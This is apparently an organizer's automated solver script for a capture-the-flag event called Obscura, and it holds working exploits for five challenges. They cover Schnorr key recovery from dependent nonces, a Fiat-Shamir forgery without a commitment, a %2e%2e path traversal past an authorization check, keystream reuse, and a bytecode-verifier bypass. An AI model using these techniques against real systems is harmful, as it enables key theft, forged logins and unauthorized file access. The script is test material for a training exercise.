#!/usr/bin/env python3
"""
Obscura — automated solver / organizer self-check.
Runs all 5 original exploits against the widgets by service name (in-network).
Pure stdlib. Exits 0 only if all 5 flags are captured.
"""
import sys, re, json, hashlib, secrets, urllib.request, urllib.parse, urllib.error

# -- same Schnorr group the crypto widgets use (RFC 3526 2048-bit safe prime) --
P = int(
    "FFFFFFFFFFFFFFFFC90FDAA22168C234C4C6628B80DC1CD1"
    "29024E088A67CC74020BBEA63B139B22514A08798E3404DD"
    "EF9519B3CD3A431B302B0A6DF25F14374FE1356D6D51C245"
    "E485B576625E7EC6F44C42E9A637ED6B0BFF5CB6F406B7ED"
    "EE386BFB5A899FA5AE9F24117C4B1FE649286651ECE45B3D"
    "C2007CB8A163BF0598DA48361C55D39A69163FA8FD24CF5F"
    "83655D23DCA3AD961C62F356208552BB9ED529077096966D"
    "670C354E4ABC9804F1746C08CA18217C32905E462E36CE3B"
    "E39E772C180E86039B2783A2EC07A28FB5C55DF06F4C52C9"
    "DE2BCBF6955817183995497CEA956AE515D2261898FA0510"
    "15728E5A8AACAA68FFFFFFFFFFFFFFFF", 16)
Q = (P - 1) // 2
G = 4


def H(*parts):
    h = hashlib.sha256()
    for x in parts:
        if isinstance(x, int):
            x = x.to_bytes((x.bit_length() + 7) // 8 or 1, "big")
        elif isinstance(x, str):
            x = x.encode()
        h.update(len(x).to_bytes(4, "big")); h.update(x)
    return int.from_bytes(h.digest(), "big")


def inv(a, m):
    return pow(a % m, -1, m)


def http(url, data=None, headers=None, method=None):
    if isinstance(data, (dict, list)):
        data = json.dumps(data).encode()
        headers = {**(headers or {}), "Content-Type": "application/json"}
    req = urllib.request.Request(url, data=data, headers=headers or {}, method=method)
    try:
        return urllib.request.urlopen(req, timeout=12).read().decode("latin1")
    except urllib.error.HTTPError as e:
        return e.read().decode("latin1")
    except Exception as e:
        return f"ERR:{e}"


def j(url, **kw):
    try:
        return json.loads(http(url, **kw))
    except Exception:
        return {}


def mf(t):
    m = re.search(r"FLAG\{[^}]*\}", t or "")
    return m.group(0) if m else None


R = {}

# -- c1 reverb : deterministic nonces are linearly dependent -> recover key --
try:
    info = j("http://c1/")
    r = int(info["public_ratio_r"], 16)
    s0 = j("http://c1/sign?msg=alpha"); s1 = j("http://c1/sign?msg=beta")
    i0, e0, x0 = s0["i"], int(s0["e"], 16), int(s0["s"], 16)
    i1, e1, x1 = s1["i"], int(s1["e"], 16), int(s1["s"], 16)
    a0, b0 = pow(r, i0, Q), e0 % Q
    a1, b1 = pow(r, i1, Q), e1 % Q
    det = (a0 * b1 - a1 * b0) % Q
    d = ((a0 * x1 - a1 * x0) * inv(det, Q)) % Q            # recovered private key
    k = secrets.randbelow(Q - 2) + 1
    Rc = pow(G, k, P); e = H(Rc, "grant-admin") % Q; s = (k + e * d) % Q
    R[1] = mf(http("http://c1/admin", data={"msg": "grant-admin", "e": hex(e), "s": hex(s)}))
except Exception as ex:
    R[1] = None

# -- c2 echo : Fiat-Shamir omits the commitment -> forge without the witness --
try:
    Y = int(j("http://c2/")["admin_public_key"], 16)
    n = j("http://c2/challenge")["nonce"]
    e = H(Y, n) % Q
    z = secrets.randbelow(Q - 2) + 1
    t = (pow(G, z, P) * pow(Y, (Q - e) % Q, P)) % P        # back-solved commitment
    R[2] = mf(http("http://c2/login", data={"nonce": n, "t": hex(t), "z": hex(z)}))
except Exception:
    R[2] = None

# -- c3 warden : /public/ prefix survives %2e%2e until after decode+normalize --
try:
    p = "/public/%2e%2e/admin/flag.txt"
    tok = j("http://c3/token?path=" + urllib.parse.quote(p, safe=""))["token"]
    R[3] = mf(http("http://c3/fetch?path=" + urllib.parse.quote(p, safe="") + "&token=" + tok))
except Exception:
    R[3] = None

# -- c4 tally : keystream depends only on len(label) -> chosen-plaintext OTP --
try:
    admin_ct = bytes.fromhex(j("http://c4/admin")["ciphertext"])
    zeros = "00" * len(admin_ct)                            # pt=0 -> ct == keystream
    ks = bytes.fromhex(j("http://c4/seal?label=xxxxx&data=" + zeros)["ciphertext"])
    R[4] = mf(bytes(a ^ b for a, b in zip(admin_ct, ks)).decode("latin1"))
except Exception:
    R[4] = None

# -- c5 cage : hide 0x20 as a PUSH immediate, JMP onto it (verifier scans linearly) --
try:
    prog = bytes([0x01, 0x20, 0x10, 0x01]).hex()           # PUSH 0x20 ; JMP 1
    R[5] = mf(http("http://c5/run", data={"program": prog}))
except Exception:
    R[5] = None

NAMES = {1: "reverb (det-nonce Schnorr)", 2: "echo (FS no-commit forge)",
         3: "warden (authz-before-normalize)", 4: "tally (keystream reuse)",
         5: "cage (verifier/VM mismatch)"}
print("== Obscura — solver ==")
for i in range(1, 6):
    print(f"  c{i} {NAMES[i]:<34} {R.get(i) or '<missing>'}")
ok = all((R.get(i) or "").startswith("FLAG{") for i in range(1, 6))
print("\nRESULT:", "ALL 5 FLAGS CAPTURED" if ok else "INCOMPLETE")
sys.exit(0 if ok else 1)
